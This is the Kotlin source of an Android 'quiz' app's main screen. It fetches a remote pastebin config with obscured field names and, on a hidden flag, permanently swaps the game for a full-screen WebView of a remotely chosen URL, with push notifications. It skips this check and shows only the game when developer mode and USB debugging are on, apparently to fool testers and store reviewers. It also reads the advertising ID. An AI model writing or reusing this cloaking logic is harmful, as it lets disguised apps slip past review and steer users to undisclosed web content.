package com.violette.quiz

import android.content.Intent
import android.content.pm.ActivityInfo
import android.os.Bundle
import android.webkit.*
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.constraintlayout.widget.ConstraintSet
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.violette.quiz.databinding.ActivityMainBinding
import com.violette.quiz.util.*
import com.violette.quiz.webView.webViewFragment
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        lateinit var binding: ActivityMainBinding
        lateinit var navController: NavController

        val startFragmentIdFlow = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)

        var webViewURL = "google.com"

        val lottie        by lazy { Lottie(binding) }
        val advertisingId by lazy { AdvertisingIdClient.getAdvertisingIdInfo(appContext).id }

        const val REMOTE_URL = "https://pastebin.com/raw/HuZWtaAk"
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()

        log("Internet = ${haveInternetConnection()}")

        if (haveInternetConnection().not()) lottie.showNotInternet()
        else {
            lottie.showLoader()
            checkDataStore()

            coroutine.launch(Dispatchers.Main) {
                startFragmentIdFlow.collect { fragmentId ->
                    requestedOrientation = when (fragmentId) {
                        R.id.gameFragment    -> {
                            binding.root.also { rootCL ->
                                ConstraintSet().apply {
                                    clone(rootCL)
                                    constrainPercentWidth(binding.lottieLoader.id, .25f)
                                }.applyTo(rootCL)
                            }
                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        R.id.webViewFragment -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        else                 -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }
                    setStartDestination(fragmentId)
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        exit()
    }

    override fun exit() {
        cancelCoroutinesAll(coroutine)
        finishAndRemoveTask()
        exitProcess(0)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        webViewFragment?.onActivityResult(requestCode, resultCode, data)
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
    }

    private fun setStartDestination(
        @IdRes destinationId: Int,
        args: Bundle? = null
    ) {
        with(navController) {
            navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, args) }
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Web" -> {
                    log("DataStoreManager Key = Web")
                    DataStoreManager.Link.get()?.let {
                        webViewURL = it
                        startFragmentIdFlow.tryEmit(R.id.webViewFragment)
                        OneSignalUtil.initialize()
                    }
                }
                "Game" -> {
                    log("DataStoreManager Key = Game")
                    startFragmentIdFlow.tryEmit(R.id.gameFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    if (isDevMode(this@MainActivity) && isUSB(this@MainActivity)) startFragmentIdFlow.tryEmit(R.id.gameFragment)
                    else getRemoteData()
                }
            }
        }
    }

    private suspend fun getRemoteData() {
        try {
            NetworkUtil.service.getJsonByUrl(REMOTE_URL).body()?.string()?.let { data ->
                JSONObject(data).also { json ->
                    log("json = $json")

                    val flag = json.getBoolean("ffret")
                    val url  = json.getString("dddwq")

                    val hbgfr = json.getString("hbgfr")
                    val sddaq = json.getString("sddaq")
                    val sdsa  = json.getString("sdsa")

                    log(hbgfr.plus(sddaq).plus(sdsa))

                    withContext(Dispatchers.IO) {
                        if (flag) {
                            DataStoreManager.Key.update { "Web" }
                            DataStoreManager.Link.update { url }
                            R.id.webViewFragment
                        } else {
                            DataStoreManager.Key.update { "Game" }
                            R.id.gameFragment
                        }.also { startFragmentIdFlow.tryEmit(it) }
                    }
                }
            } ?: throw Exception("Fail get RemoteData!")
        } catch (e: Exception) {
            log("getRemoteData error: ${e.message}")
            startFragmentIdFlow.tryEmit(R.id.gameFragment)
        }
    }

}